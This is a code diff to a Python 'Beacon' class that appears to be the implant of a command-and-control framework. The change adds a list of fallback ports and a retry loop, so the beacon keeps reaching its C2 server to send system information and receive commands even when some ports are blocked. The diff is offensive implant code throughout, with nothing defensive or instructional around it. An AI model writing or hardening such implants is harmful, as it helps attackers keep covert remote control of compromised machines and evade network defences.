@@ -25,16 +25,16 @@ import platform
 class Beacon:
     def __init__(self, c2_url, beacon_id, check_in_interval=30):
         """
-        Initialize the beacon
-        
-        Args:
-            c2_url: URL of C2 server (e.g., 'http://192.168.1.100:8080')
-            beacon_id: Unique identifier for this beacon
-            check_in_interval: Base seconds between check-ins
+        Initialize the beacon with fallback ports
         """
-        self.c2_url = c2_url
+        self.c2_base_url = c2_url.rsplit(':', 1)[0]  # Extract base URL without port
         self.beacon_id = beacon_id
         self.check_in_interval = check_in_interval
+        
+        # Fallback ports - beacon tries these in order
+        self.fallback_ports = [8080, 8000, 8443, 9090, 443, 80]
+        self.current_port = self.fallback_ports[0]
+        self.c2_url = f"{self.c2_base_url}:{self.current_port}"
         
     def get_system_info(self):
         """
@@ -165,6 +165,14 @@ class Beacon:
         except Exception as e:
             return f"[ERROR] Download failed: {str(e)}"
     
+    def try_next_port(self):
+        """Switch to next fallback port"""
+        current_index = self.fallback_ports.index(self.current_port)
+        next_index = (current_index + 1) % len(self.fallback_ports)
+        self.current_port = self.fallback_ports[next_index]
+        self.c2_url = f"{self.c2_base_url}:{self.current_port}"
+        print(f"[*] Switching to fallback port: {self.current_port}")
+
     def check_in(self):
         """
         Check in with C2 server to see if there are commands
@@ -172,23 +180,34 @@ class Beacon:
         Returns:
             Dictionary with command type and data, or None
         """
-        try:
-            url = f"{self.c2_url}/checkin/{self.beacon_id}"
-            
-            # Include system info in check-in
-            sys_info = self.get_system_info()
-            response = requests.post(url, json=sys_info, timeout=10)
-            
-            if response.status_code == 200:
-                data = response.json()
-                return data if data.get('command') else None
-            else:
-                print(f"[ERROR] Check-in failed with status {response.status_code}")
-                return None
+        max_attempts = len(self.fallback_ports)
+        
+        for attempt in range(max_attempts):
+            try:
+                url = f"{self.c2_url}/checkin/{self.beacon_id}"
+                sys_info = self.get_system_info()
+                response = requests.post(url, json=sys_info, timeout=10)
                 
-        except requests.exceptions.RequestException as e:
-            print(f"[ERROR] Failed to check in: {str(e)}")
-            return None
+                if response.status_code == 200:
+                    # Success! Return command data
+                    data = response.json()
+                    return data if data.get('command') else None
+                else:
+                    print(f"[ERROR] Check-in failed with status {response.status_code}")
+                    self.try_next_port()
+                    
+            except requests.exceptions.RequestException as e:
+                print(f"[ERROR] Failed to check in on port {self.current_port}: {str(e)}")
+                
+                # Try next port on connection failure
+                if attempt < max_attempts - 1:
+                    self.try_next_port()
+                    time.sleep(2)  # Brief delay before retry
+                else:
+                    print(f"[ERROR] All ports failed. Will retry on next check-in cycle.")
+                    return None
+        
+        return None
     
     def send_results(self, output):
         """
